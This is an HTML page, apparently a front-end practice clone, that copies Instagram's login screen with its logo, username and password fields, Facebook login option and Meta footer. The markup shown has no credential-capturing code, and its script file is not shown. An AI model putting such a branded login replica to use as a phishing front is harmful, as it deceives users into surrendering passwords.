<!DOCTYPE html>
<html lang="pt-BR">

<head>
	<meta charset="UTF-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
	<link rel="stylesheet" href="./css/style.css">
	<title>document</title>
</head>

<body>
	<div class="container">
		<div class="box-images">
			<img class="iphone" src="./celular.png" />
			<img class="img-insta1" src="./94edb770accf.png" />
			<img class="img-insta1" src="./a4fd825e3d49.png" />
			<img class="img-insta1" src="./4d62acb667fb.png" />
			<img class="img-insta1" src="./fdfe239b7c9f.png" />
		</div>
		<div class="wrapper">
			<div class="header">
				<div class="top">
					<div class="logo">
						<img src="instagram.png" alt="instagram" style="width: 175px;">
					</div>
					<div class="form">
						<div class="input-field">
							<input type="text" placeholder="Phone numbers, username, or email" class="input">
						</div>
						<div class="input-field">
							<input type="password" placeholder="Password" class="input">
						</div>
						<div class="btn"><a href="#">Log in</a></div>
					</div>
					<div class="or">
						<div class="line"></div>
						<p>OR</p>
						<div class="line"></div>
					</div>
					<div class="dif">
						<div class="fb">
							<img src="facebook.png" alt="facebook">
							<p>Log in with Facebook</p>
						</div>
						<div class="forgot">
							<a href="#">Forgot password</a>
						</div>
					</div>
				</div>
				<div class="signup">
					<p style="text-align: center;">Don't have an account? <a href="#">Sign up</a></p>
				</div>
				<div class="apps">
					<p>Get the app.</p>
					<div class="icons">
						<a href="#"><img src="appstore.png" alt="appstore"></a>
						<a href="#"><img src="googleplay.png" alt="googleplay"></a>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div style="height:10%">
		<div class="foot-content">
			<span>Meta</span>
			<span>About</span>
			<span>Blog</span>
			<span>Jobs</span>
			<span>Help</span>
			<span>API</span>
			<span>Privacy</span>
			<span>Terms</span>
			<span>Top Accounts</span>
			<span>Hashtags</span>
			<span>Locations</span>
			<span>Instagram Lite</span>
			<span>Contact Uploading & Non-Users</span>
			<span>Dance</span>
			<span>Food & Drink</span>
			<span>Home & Garden</span>
			<span>Music</span>
			<span>Visual Arts</span>
		</div>
		<div style="text-align: center; color: gray; font-size: 12px; margin: 1%;">@ 2022 Instagram from Meta</div>
	</div>
	<script src="./index.js"></script>
</body>

</html>
